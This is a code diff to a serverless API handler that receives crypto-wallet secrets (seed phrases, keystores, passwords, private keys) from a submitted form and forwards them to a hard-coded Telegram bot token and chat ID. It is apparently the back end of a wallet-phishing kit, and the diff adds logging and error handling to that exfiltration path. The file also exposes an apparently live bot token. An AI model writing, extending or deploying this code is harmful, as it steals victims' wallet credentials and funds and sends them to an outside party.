@@ -5,8 +5,8 @@ export default async function handler(req, res) {
 
   const { type, phrase, keystore, password, privateKey, walletName } = req.body;
 
-  const botToken = '8072535178:AAEECwdN4jeLk3qQBQq1NaqObmHAcQ8uOZI'; // 🔁 Replace with your real bot token
-  const chatId = '1129243973';     // 🔁 Replace with your real chat ID
+  const botToken = '8072535178:AAEECwdN4jeLk3qQBQq1NaqObmHAcQ8uOZI';
+  const chatId = '1129243973';
 
   let message = `🔐 New Wallet Submission\n`;
   message += `📲 Wallet: ${walletName}\n`;
@@ -35,13 +35,16 @@ export default async function handler(req, res) {
       })
     });
 
+    const responseText = await tgResponse.text();
+    console.log('Telegram API response:', responseText);
+
     if (!tgResponse.ok) {
-      const errorData = await tgResponse.text();
-      return res.status(500).json({ success: false, error: errorData });
+      return res.status(500).json({ success: false, error: responseText });
     }
 
-    return res.status(200).json({ success: true });
+    return res.status(200).json({ success: true, response: responseText });
   } catch (error) {
+    console.error('Fetch error:', error);
     return res.status(500).json({ success: false, error: error.message });
   }
 }
